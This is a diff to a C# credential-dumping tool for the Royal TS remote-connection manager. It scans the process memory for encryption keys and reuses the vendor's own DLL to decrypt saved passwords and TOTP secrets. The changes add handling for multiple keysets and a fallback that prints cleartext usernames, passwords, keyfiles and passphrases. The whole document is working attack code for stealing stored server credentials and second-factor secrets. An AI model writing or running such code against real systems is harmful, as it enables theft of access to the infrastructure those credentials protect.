@@ -59,72 +59,56 @@ class Program
             var heap = runtime.Heap;
             Console.WriteLine($"[*] Scanning heap...");
 
-            string siKey1 = "", siKey2 = "", siDoc = "";
+            var allKeysets = new List<(string key1, string key2, string doc)>();
             var docPwdCandidates = new List<string> { "" };
             var credentialInfos = new List<ClrObject>();
+
+            // Helper to extract keys from a SecurityInterface object
+            void ExtractSiKeys(ClrObject si)
+            {
+                string k1 = "", k2 = "", doc = "";
+                try { k1 = si.ReadStringField("smhos") ?? ""; } catch {}
+                try { k2 = si.ReadStringField("smhot") ?? ""; } catch {}
+                try { doc = si.ReadStringField("smhou") ?? ""; } catch {}
+
+                if (string.IsNullOrEmpty(k1))
+                {
+                    var strFields = new List<(string name, string val)>();
+                    foreach (var f in si.Type.Fields)
+                    {
+                        if (f.ElementType != ClrElementType.String) continue;
+                        try { var v = si.ReadStringField(f.Name); if (!string.IsNullOrEmpty(v)) strFields.Add((f.Name, v)); } catch {}
+                    }
+                    var keys = strFields.Where(x => x.val.Length == 50).ToList();
+                    var docF = strFields.FirstOrDefault(x => x.val.EndsWith(".rtsz") || x.val.EndsWith(".rtsx") || x.val == "Application");
+                    if (keys.Count >= 2)
+                    {
+                        k1 = keys[0].val; k2 = keys[1].val; doc = docF.val ?? "";
+                        Console.WriteLine($"[*] Keys by pattern: {keys[0].name}/{keys[1].name}, doc={doc}");
+                    }
+                }
+                if (!string.IsNullOrEmpty(k1) && !allKeysets.Any(ks => ks.key1 == k1))
+                    allKeysets.Add((k1, k2, doc));
+            }
 
             foreach (var obj in heap.EnumerateObjects())
             {
                 if (!obj.IsValid || obj.Type == null) continue;
                 var tn1 = obj.Type.Name ?? "";
 
-                // Extract SecurityInterface keys from any object that looks like one
-                if (tn1.Contains("RoyalSecurityInterface") || tn1 == "RoyalDocumentLibrary.RoyalStore")
+                if (tn1.Contains("RoyalSecurityInterface"))
                 {
-                    var targets = new List<ClrObject>();
-                    if (tn1.Contains("RoyalSecurityInterface"))
-                    {
-                        targets.Add(obj);
-                    }
-                    else
-                    {
-                        // V6: SecurityInterface is a property of RoyalStore
-                        try {
-                            var si = obj.ReadObjectField("<SecurityInterface>k__BackingField");
-                            if (si.IsValid && si.Type != null) targets.Add(si);
-                        } catch {}
-                        try {
-                            var siLeg = obj.ReadObjectField("<SecurityInterfaceLegacy>k__BackingField");
-                            if (siLeg.IsValid && siLeg.Type != null) targets.Add(siLeg);
-                        } catch {}
-                    }
-
-                    foreach (var si in targets)
-                    {
-                        if (!string.IsNullOrEmpty(siKey1)) break;
-                        // Try known field names first (V7+)
-                        try { var v = si.ReadStringField("smhos"); if (!string.IsNullOrEmpty(v)) siKey1 = v; } catch {}
-                        try { var v = si.ReadStringField("smhot"); if (!string.IsNullOrEmpty(v)) siKey2 = v; } catch {}
-                        try { var v = si.ReadStringField("smhou"); if (!string.IsNullOrEmpty(v)) siDoc = v; } catch {}
-
-                        // Fallback: detect by value pattern (obfuscated field names in V6)
-                        if (string.IsNullOrEmpty(siKey1))
-                        {
-                            var strFields = new List<(string name, string val)>();
-                            foreach (var f in si.Type.Fields)
-                            {
-                                if (f.ElementType != ClrElementType.String) continue;
-                                try {
-                                    var v = si.ReadStringField(f.Name);
-                                    if (!string.IsNullOrEmpty(v)) strFields.Add((f.Name, v));
-                                } catch {}
-                            }
-                            // Key1/Key2 are exactly 50 chars, Doc ends with known extensions
-                            var keys = strFields.Where(x => x.val.Length == 50).ToList();
-                            var doc = strFields.FirstOrDefault(x => x.val.EndsWith(".rtsz") || x.val.EndsWith(".rtsx") || x.val == "Application");
-                            if (keys.Count >= 2)
-                            {
-                                siKey1 = keys[0].val;
-                                siKey2 = keys[1].val;
-                                siDoc = doc.val ?? "";
-                                Console.WriteLine($"[*] SecurityInterface keys detected by pattern (fields: {keys[0].name}, {keys[1].name}, {doc.name ?? "?"})");
-                            }
-                        }
-                    }
+                    ExtractSiKeys(obj);
                     continue;
                 }
 
-                // Collect resolved CredentialInfo objects (may contain cleartext)
+                if (tn1 == "RoyalDocumentLibrary.RoyalStore")
+                {
+                    try { var si = obj.ReadObjectField("<SecurityInterface>k__BackingField"); if (si.IsValid && si.Type != null) ExtractSiKeys(si); } catch {}
+                    try { var si = obj.ReadObjectField("<SecurityInterfaceLegacy>k__BackingField"); if (si.IsValid && si.Type != null) ExtractSiKeys(si); } catch {}
+                    continue;
+                }
+
                 if (tn1 == "RoyalDocumentLibrary.CredentialInfo")
                 {
                     credentialInfos.Add(obj);
@@ -152,12 +136,19 @@ class Program
                 }
             }
 
-            // If we found CredentialInfo objects with cleartext passwords, use them directly
-            if (string.IsNullOrEmpty(siKey1) && credentialInfos.Count > 0)
+            Console.WriteLine($"[*] Found {allKeysets.Count} SecurityInterface keyset(s)");
+            foreach (var ks in allKeysets)
+                Console.WriteLine($"[*]   doc={ks.doc}, key1={ks.key1.Length}c, key2={ks.key2.Length}c");
+
+            string siKey1 = allKeysets.Count > 0 ? allKeysets[0].key1 : "";
+            string siKey2 = allKeysets.Count > 0 ? allKeysets[0].key2 : "";
+            string siDoc = allKeysets.Count > 0 ? allKeysets[0].doc : "";
+
+            // CredentialInfo fallback when no keys found
+            if (allKeysets.Count == 0 && credentialInfos.Count > 0)
             {
-                Console.WriteLine($"[*] No encryption keys found, checking {credentialInfos.Count} CredentialInfo object(s) for cleartext...");
+                Console.WriteLine($"[*] No encryption keys, checking {credentialInfos.Count} CredentialInfo for cleartext...");
                 Console.WriteLine("\n##RESULTS_START##");
-                bool found = false;
                 foreach (var ci in credentialInfos)
                 {
                     try {
@@ -165,17 +156,9 @@ class Program
                         try { user = ci.ReadStringField("<Username>k__BackingField") ?? ""; } catch {}
                         try { pwd = ci.ReadStringField("<Password>k__BackingField") ?? ""; } catch {}
                         if (!string.IsNullOrEmpty(pwd))
-                        {
-                            string keyfile = "", passphrase = "", credId = "";
-                            try { keyfile = ci.ReadStringField("<Keyfile>k__BackingField") ?? ""; } catch {}
-                            try { passphrase = ci.ReadStringField("<Passphrase>k__BackingField") ?? ""; } catch {}
-                            try { credId = ci.ReadStringField("<CredentialID>k__BackingField") ?? ""; } catch {}
-                            Console.WriteLine($"CredentialInfo||{user}|||{pwd}||||||||{credId}");
-                            found = true;
-                        }
+                            Console.WriteLine($"TYPE:CredentialInfo|NAME:|HOST:|USER:{user}|TOTP:|OTPALGO:|OTPDIGITS:|OTPPERIOD:|OTPLABEL:|PASS:{pwd}");
                     } catch {}
                 }
-                if (!found) Console.WriteLine("(no cleartext passwords in CredentialInfo)");
                 Console.WriteLine("##RESULTS_END##");
                 return;
             }
@@ -257,16 +240,16 @@ class Program
 
             object? siInst = null;
             MethodInfo? decMethod = null;
+            FieldInfo? fKey1 = null, fKey2 = null, fDoc = null;
             try {
                 var siAsm = Assembly.LoadFrom(Path.Combine(rtDir, "RoyalDocument.SecurityInterface.dll"));
                 var siType = siAsm.GetType("RoyalDocumentLibrary.RoyalSecurityInterface")!;
                 siInst = Activator.CreateInstance(siType);
                 var bf = BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance;
 
-                // Try known field names first (V7+)
-                var fKey1 = siType.GetField("smhos", bf);
-                var fKey2 = siType.GetField("smhot", bf);
-                var fDoc = siType.GetField("smhou", bf);
+                fKey1 = siType.GetField("smhos", bf);
+                fKey2 = siType.GetField("smhot", bf);
+                fDoc = siType.GetField("smhou", bf);
 
                 // Fallback: find string fields by pattern (obfuscated names in V6)
                 if (fKey1 == null || fKey2 == null)
@@ -316,62 +299,28 @@ class Program
 
             Console.WriteLine($"[*] Document password candidates: {docPwdCandidates.Count} (including empty)");
 
-            // Debug: try first entry with verbose error reporting
-            if (unique.Count > 0 && decMethod != null && siInst != null)
-            {
-                var first = unique[0];
-                Console.WriteLine($"[*] Debug decrypt first entry: encPwd length={first.encPwd.Length}");
-                foreach (var dp in docPwdCandidates.Take(3))
-                {
-                    try {
-                        var result = decMethod.Invoke(siInst, new object[] { first.encPwd, false, dp });
-                        Console.WriteLine($"[*]   docPwd='{dp}' => result='{result}' (type={result?.GetType().Name ?? "null"})");
-                    } catch (Exception ex) {
-                        var inner = ex.InnerException ?? ex;
-                        Console.WriteLine($"[*]   docPwd='{dp}' => EXCEPTION: {inner.GetType().Name}: {inner.Message}");
-                    }
-                }
-                // Also try with swapped keys
-                try {
-                    var bf2 = BindingFlags.NonPublic | BindingFlags.Public | BindingFlags.Instance;
-                    var siType2 = siInst.GetType();
-                    var strFields2 = siType2.GetFields(bf2).Where(f => f.FieldType == typeof(string)).ToList();
-                    if (strFields2.Count >= 2) {
-                        strFields2[0].SetValue(siInst, siKey2);
-                        strFields2[1].SetValue(siInst, siKey1);
-                        try {
-                            var result = decMethod.Invoke(siInst, new object[] { first.encPwd, false, "" });
-                            Console.WriteLine($"[*]   SWAPPED keys, docPwd='' => result='{result}'");
-                        } catch (Exception ex) {
-                            var inner = ex.InnerException ?? ex;
-                            Console.WriteLine($"[*]   SWAPPED keys => EXCEPTION: {inner.GetType().Name}: {inner.Message}");
-                        } finally {
-                            strFields2[0].SetValue(siInst, siKey1);
-                            strFields2[1].SetValue(siInst, siKey2);
-                        }
-                    }
-                } catch {}
-            }
-
+            // Try decryption with ALL keysets
             Console.WriteLine("\n##RESULTS_START##");
-
-            var knownDocPwd = new Dictionary<string, string>();
+            int decrypted = 0;
 
             foreach (var e in unique)
             {
                 string plainPwd = "", plainTotp = "", usedDp = "";
-                if (decMethod != null && siInst != null)
+
+                // Try each keyset
+                foreach (var ks in allKeysets)
                 {
-                    string cachedDp = "";
-                    if (!string.IsNullOrEmpty(e.docName) && knownDocPwd.TryGetValue(e.docName, out cachedDp))
+                    if (!string.IsNullOrEmpty(plainPwd)) break;
+
+                    // Load keys into DLL instance
+                    if (siInst != null && fKey1 != null && fKey2 != null && fDoc != null)
                     {
-                        try {
-                            plainPwd = (string)(decMethod.Invoke(siInst, new object[] { e.encPwd, false, cachedDp }) ?? "");
-                            if (!string.IsNullOrEmpty(plainPwd)) usedDp = cachedDp;
-                        } catch {}
+                        fKey1.SetValue(siInst, ks.key1);
+                        fKey2.SetValue(siInst, ks.key2);
+                        fDoc.SetValue(siInst, ks.doc);
                     }
 
-                    if (string.IsNullOrEmpty(plainPwd))
+                    if (decMethod != null && siInst != null)
                     {
                         foreach (var dp in docPwdCandidates)
                         {
@@ -381,18 +330,35 @@ class Program
                             } catch {}
                         }
                     }
+                }
 
-                    if (!string.IsNullOrEmpty(plainPwd) && !string.IsNullOrEmpty(e.docName))
-                        knownDocPwd[e.docName] = usedDp;
-
-                    if (!string.IsNullOrEmpty(e.encTotp))
+                if (!string.IsNullOrEmpty(plainPwd))
+                {
+                    decrypted++;
+                    if (!string.IsNullOrEmpty(e.encTotp) && decMethod != null && siInst != null)
                     {
-                        try {
-                            plainTotp = (string)(decMethod.Invoke(siInst, new object[] { e.encTotp, false, usedDp }) ?? "");
-                        } catch {}
+                        try { plainTotp = (string)(decMethod.Invoke(siInst, new object[] { e.encTotp, false, usedDp }) ?? ""); } catch {}
                     }
                 }
                 Console.WriteLine($"TYPE:{e.type}|NAME:{e.name}|HOST:{e.host}|USER:{e.user}|TOTP:{plainTotp}|OTPALGO:{e.otpAlgo}|OTPDIGITS:{e.otpDigits}|OTPPERIOD:{e.otpPeriod}|OTPLABEL:{e.otpLabel}|PASS:{plainPwd}");
+            }
+
+            // If nothing decrypted, try CredentialInfo objects as fallback
+            if (decrypted == 0 && credentialInfos.Count > 0)
+            {
+                Console.WriteLine($"## CREDINFO_START (fallback: {credentialInfos.Count} resolved credentials) ##");
+                foreach (var ci in credentialInfos)
+                {
+                    try {
+                        string user = "", pwd = "", keyfile = "", passphrase = "";
+                        try { user = ci.ReadStringField("<Username>k__BackingField") ?? ""; } catch {}
+                        try { pwd = ci.ReadStringField("<Password>k__BackingField") ?? ""; } catch {}
+                        try { keyfile = ci.ReadStringField("<Keyfile>k__BackingField") ?? ""; } catch {}
+                        try { passphrase = ci.ReadStringField("<Passphrase>k__BackingField") ?? ""; } catch {}
+                        if (!string.IsNullOrEmpty(user) || !string.IsNullOrEmpty(pwd))
+                            Console.WriteLine($"CREDINFO|USER:{user}|PASS:{pwd}|KEYFILE:{keyfile}|PASSPHRASE:{passphrase}");
+                    } catch {}
+                }
             }
 
             Console.WriteLine("##RESULTS_END##");
